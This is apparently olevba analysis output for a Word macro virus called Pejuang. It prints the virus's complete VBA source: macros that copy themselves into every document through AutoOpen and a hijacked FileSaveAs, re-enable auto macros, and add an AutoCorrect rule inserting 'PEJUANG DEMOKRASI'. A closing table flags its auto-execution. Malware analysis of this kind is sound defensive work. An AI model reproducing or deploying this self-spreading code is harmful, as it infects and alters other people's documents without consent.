olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pejuang-69a039b6bd386a362fc5942b1aaaedc286d9eca9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pejuang-69a039b6bd386a362fc5942b1aaaedc286d9eca9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Perjuangan.bas 
in file: Virus.MSWord.Pejuang-69a039b6bd386a362fc5942b1aaaedc286d9eca9 - OLE stream: 'Macros/VBA/Perjuangan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo SETOP
WordBasic.ToolsAutoCorrect InitialCaps:=1, SentenceCaps:=1, Days:=17, CapsLock:=1, ReplaceText:=1, Formatting:=0, Replace:="teh", With:="PEJUANG DEMOKRASI", Add:=1, SmartQuotes:=1
WordBasic.ToolsAutoCorrect InitialCaps:=1, SentenceCaps:=1, Days:=17, CapsLock:=1, ReplaceText:=1, Formatting:=0, Replace:="teh", With:="PEJUANG DEMOKRASI", SmartQuotes:=1
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Revolusi", sTMacro$
sTMacro$ = sMe$ + ":Revolusi"
WordBasic.MacroCopy "Global:Revolusi", sTMacro$
sTMacro$ = sMe$ + ":Perjuangan"
WordBasic.MacroCopy "Global:Perjuangan", sTMacro$
sTMacro$ = sMe$ + ":Public"
WordBasic.MacroCopy "Global:Public", sTMacro$


WordBasic.FileSaveAs dlg
GoTo Done

SETOP:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Pejuang-69a039b6bd386a362fc5942b1aaaedc286d9eca9 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Lungo
WordBasic.ToolsAutoCorrect InitialCaps:=1, SentenceCaps:=1, Days:=17, CapsLock:=1, ReplaceText:=1, Formatting:=0, Replace:="teh", With:="PEJUANG DEMOKRASI", Add:=1, SmartQuotes:=1
WordBasic.ToolsAutoCorrect InitialCaps:=1, SentenceCaps:=1, Days:=17, CapsLock:=1, ReplaceText:=1, Formatting:=0, Replace:="teh", With:="PEJUANG DEMOKRASI", SmartQuotes:=1
WordBasic.CurValues.FileSaveAs dlg
WordBasic.DisableAutoMacros 0
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
WordBasic.MacroCopy "Global:Revolusi", WordBasic.[WindowName$]() + ":Revolusi", 1
WordBasic.MacroCopy "Global:Perjuangan", WordBasic.[WindowName$]() + ":Perjuangan", 1
WordBasic.MacroCopy "Global:Public", WordBasic.[WindowName$]() + ":Public", 1
WordBasic.FileSaveAs dlg
GoTo Lungo
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Lungo:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ModulePublic.bas 
in file: Virus.MSWord.Pejuang-69a039b6bd386a362fc5942b1aaaedc286d9eca9 - OLE stream: 'Macros/VBA/ModulePublic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Rem PEJUANG  DEMOKRASI
        Rem YOGYAKARTA 96
        Rem PESAN INI UNTUK MENGETUK HATI NURANI RAKYAT
        Rem MARI BERJUANG BERSAMA KAMI
        Rem TEGAKKAN KEADILAN YANG TELAH DIINJAK-INJAK
        Rem  UNDERGROUND PUBLIC MESSAGES
        Rem    !!!!!!!!!!!!!!!!!!!!!!!!!
Rem GepenkUajy96
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

